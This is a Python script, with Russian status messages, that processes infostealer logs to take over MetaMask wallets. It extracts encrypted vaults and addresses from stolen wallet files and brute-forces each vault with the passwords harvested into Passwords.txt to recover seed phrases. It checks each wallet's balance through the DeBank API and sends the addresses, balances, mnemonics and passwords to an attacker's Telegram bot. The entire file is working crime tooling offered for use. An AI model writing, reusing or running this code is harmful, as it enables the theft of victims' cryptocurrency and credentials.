import base64
import hashlib
import json
import os
import re

import requests as requests

meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}

with open('config.json', 'r') as fp:
    cfg = json.loads(fp.read())


def sendmsg(id, text):
    url = f"https://api.telegram.org/bot{cfg[0]['bot_token']}/sendMessage"
    data = {
        'chat_id': f'{id}',
        'text': f'{text}',
        'parse_mode': f'html'
    }
    response = requests.get(url, data=data)
    print(response.json())


def check_password(info, passwd):
    import json
    data = json.loads(info)
    password = passwd
    salt = base64.b64decode(data['salt'])
    vault = base64.b64decode(data['data'])
    iv = base64.b64decode(data['iv'])

    key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8', 'ignore'), salt, 10000, 32)

    from Crypto.Cipher import AES
    decrypted_block = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt(vault)
    try:
        if decrypted_block.decode('utf-8', 'ignore').__contains__('"mnemonic":"'):
            mnemonic = decrypted_block.decode('utf-8', 'ignore')[43:][:77]
            return f"Mnemonic: {mnemonic}\nPassword: {passwd}"
        else:
            return None
    except:
        return None


def check_balance():
    global msg
    vault = ""
    addresses1 = []
    used_passes = []
    checked_addresses = []
    logs = os.listdir(os.getcwd() + "\\logs")
    if len(logs) < 1:
        print("Логов нету.")
        return
    for log in logs:
        if not os.path.exists(f"{os.getcwd()}\\logs\\{log}\\Wallets"):
            print("Нету папки валлетс.")
            continue
        wallets = os.listdir(f"{os.getcwd()}\\logs\\{log}\\Wallets")
        for wallet in wallets:
            if wallet.lower().__contains__("metamask"):
                meta_files = os.walk(f"{os.getcwd()}\\logs\\{log}\\Wallets\\{wallet}")
                for files in meta_files:
                    for file in files[2]:
                        if file.__contains__(".log"):
                            log_file = open(f"{os.getcwd()}\\logs\\{log}\\Wallets\\{wallet}\\{file}", "r",
                                            errors='ignore').read(5000)
                            data = log_file.replace('\\', '')
                            try:
                                vault = re.search('{"vault":"(.+)"},"MetaMetricsController"', data).groups()[0]
                                addresses = re.search('"CachedBalancesController":(.+),"C', data).groups()[0].split(",")
                            except:
                                print("No reg")
                                continue
                            for address in addresses:
                                try:
                                    addresses1.append(re.search('0x(.+)":{"(.+)', address.split('":"')[0]).groups()[1])
                                except:
                                    continue
                            break
                        else:
                            continue
            else:
                continue
        mnemonic = ""
        if os.path.exists(f"{os.getcwd()}\\logs\\{log}\\Passwords.txt"):
            passwords = open(f"{os.getcwd()}\\logs\\{log}\\Passwords.txt", "r")
            for line in passwords.readlines():
                if line.__contains__("Password: "):
                    password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
                    if password in used_passes:
                        continue
                    mnemonic = check_password(vault, password)
                    if mnemonic:
                        break
                    used_passes.append(password)
            used_passes.clear()
        for address in addresses1:
            if address in checked_addresses:
                continue
            msg = f"Address: {address}\nBalance: "
            for site, css in meta_sites.items():
                req = requests.get(f'https://openapi.debank.com/v1/user/total_balance?id={address}').content
                try:
                    info = json.loads(req)
                    msg += f"{str(info['total_usd_value'])}$ \n"
                except:
                    msg += f"{site + address} error\n"
                if mnemonic:
                    msg += f"{mnemonic}"
            checked_addresses.append(address)
            sendmsg(cfg[0]['telegram_id'], msg)


if __name__ == "__main__":
    check_balance()